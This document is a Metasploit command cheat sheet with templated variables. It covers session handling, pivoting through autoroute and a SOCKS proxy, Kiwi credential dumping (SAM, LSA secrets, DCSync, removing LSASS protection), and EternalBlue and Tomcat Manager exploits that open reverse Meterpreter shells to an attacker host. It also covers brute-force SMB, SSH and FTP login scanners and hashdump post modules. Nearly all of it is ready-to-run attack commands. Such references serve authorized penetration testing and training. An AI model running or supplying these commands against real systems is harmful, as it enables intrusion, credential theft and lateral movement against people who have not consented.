# Metasploit

## sessions

### List sessions

List active Metasploit sessions.

```sh title:"List Metasploit sessions"
sessions -l
```
<!-- cheat -->

### Upgrade session

Upgrade a shell session to Meterpreter.

```sh title:"Upgrade shell session to Meterpreter"
sessions -u "$session_id"
```
<!-- cheat
var session_id
-->

### Route table

Print Metasploit's route table.

```sh title:"Print Metasploit route table"
route print
```
<!-- cheat -->

## pivot

### Autoroute

Use the autoroute module for a session.

```sh title:"Use Metasploit autoroute module"
use multi/manage/autoroute
set SESSION $session_id
run
```
<!-- cheat
var session_id
-->

### SOCKS proxy

Start a Metasploit SOCKS proxy after adding routes.

```sh title:"Start Metasploit SOCKS proxy"
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
run -j
```
<!-- cheat -->

## meterpreter

### Load kiwi

Load Kiwi into Meterpreter.

```sh title:"Load Kiwi in Meterpreter"
load kiwi
```
<!-- cheat -->

### Dump credentials

Dump credentials with Kiwi.

```sh title:"Dump credentials with Kiwi"
creds_all
```
<!-- cheat -->

### Dump SAM and secrets

Dump SAM and LSA secrets with Kiwi.

```sh title:"Dump SAM and LSA secrets with Kiwi"
lsa_dump_sam
lsa_dump_secrets
```
<!-- cheat -->

### DCSync

Run Kiwi DCSync against a domain controller.

```sh title:"Run Kiwi DCSync"
dcsync "$domain_controller_name"
```
<!-- cheat
var domain_controller_name
-->

### Execute process

Create a hidden process from Meterpreter.

```sh title:"Create hidden process from Meterpreter"
execute -H -f "$process"
```
<!-- cheat
var process := notepad.exe
-->

### Migrate by name

Migrate Meterpreter into a process by name.

```sh title:"Migrate Meterpreter by process name"
migrate -N "$process_name"
```
<!-- cheat
var process_name := notepad.exe
-->

### Remove PPL

Remove LSASS process protection with Kiwi, then dump credentials.

```sh title:"Remove LSASS PPL with Kiwi"
load kiwi
kiwi_cmd "!processprotect /process:lsass.exe /remove"
creds_all
```
<!-- cheat -->

## modules

### LAPS

Use the Windows LAPS gather module.

```sh title:"Use Metasploit LAPS gather module"
use post/windows/gather/laps
set SESSION $session_id
run
```
<!-- cheat
var session_id
-->

### EternalBlue x64

Run MS17-010 EternalBlue with x64 Meterpreter payload.

```sh title:"Run MS17-010 EternalBlue x64 Meterpreter"
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $rhost_ip
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $lhost
set LPORT $lport
run
```
<!-- cheat
var rhost_ip
var lhost
var lport
-->

### SMB login

Run SMB login scanner with username and password files.

```sh title:"Run SMB login scanner"
use auxiliary/scanner/smb/smb_login
set RHOSTS $rhost_ip
set USER_FILE $user_file
set PASS_FILE $pass_file
run
```
<!-- cheat
var rhost_ip
var user_file
var pass_file
-->

### SSH login

Run SSH login scanner with username and password files.

```sh title:"Run SSH login scanner"
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $rhost_ip
set USER_FILE $user_file
set PASS_FILE $pass_file
run
```
<!-- cheat
var rhost_ip
var user_file
var pass_file
-->

### FTP login

Run FTP login scanner with username and password files.

```sh title:"Run FTP login scanner"
use auxiliary/scanner/ftp/ftp_login
set RHOSTS $rhost_ip
set USER_FILE $user_file
set PASS_FILE $pass_file
run
```
<!-- cheat
var rhost_ip
var user_file
var pass_file
-->

### Tomcat manager deploy

Deploy a Meterpreter payload through Tomcat Manager.

```sh title:"Deploy Meterpreter through Tomcat Manager"
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS $rhost_ip
set RPORT $rport
set USERNAME $user
set PASSWORD $pass
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $lhost
set LPORT $lport
run
```
<!-- cheat
var rhost_ip
var rport := 8080
var user
var pass
var lhost
var lport
-->

### Hashdump

Run the Windows hashdump post module.

```sh title:"Run Windows hashdump post module"
use post/windows/gather/hashdump
set SESSION $session_id
run
```
<!-- cheat
var session_id
-->

### Credential collector

Run the Windows credential collector post module.

```sh title:"Run Windows credential collector post module"
use post/windows/gather/credentials/credential_collector
set SESSION $session_id
run
```
<!-- cheat
var session_id
-->
